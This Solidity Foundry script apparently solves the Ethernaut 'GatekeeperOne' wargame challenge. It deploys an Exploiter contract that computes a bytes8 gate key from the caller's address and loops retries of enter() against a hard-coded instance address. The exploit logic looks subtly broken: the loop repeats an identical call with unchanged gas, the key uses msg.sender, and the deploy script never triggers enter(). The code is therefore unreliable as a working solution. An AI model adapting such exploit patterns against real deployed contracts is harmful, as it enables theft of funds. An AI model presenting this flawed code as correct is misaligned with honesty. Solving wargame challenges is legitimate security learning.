// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Deployer is Script {
    address constant INSTANCE = 0xD23c089434981C38B540955c7d49Fc61f296a9B3;

    function run() external {
        vm.startBroadcast();
        new Exploiter(INSTANCE);
        vm.stopBroadcast();
    }
}

contract Exploiter {
    address immutable GATE;

    constructor(address _gate) {
        GATE = _gate;
    }

    function enter() external {
        bytes8 key = _getKey();
        bool success;
        while (!success) {
            try IGatekeeperOne(GATE).enter(key) {
                success = true;
            }
            catch {}
        }
   }

    function _getKey() internal returns(bytes8 key) {
        uint160 _mask = uint160(address(1)) << 63; 
        uint160 _last16 = uint160(uint16(uint160(msg.sender)));
        key = bytes8(uint64(_mask + _last16));
    }
}

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}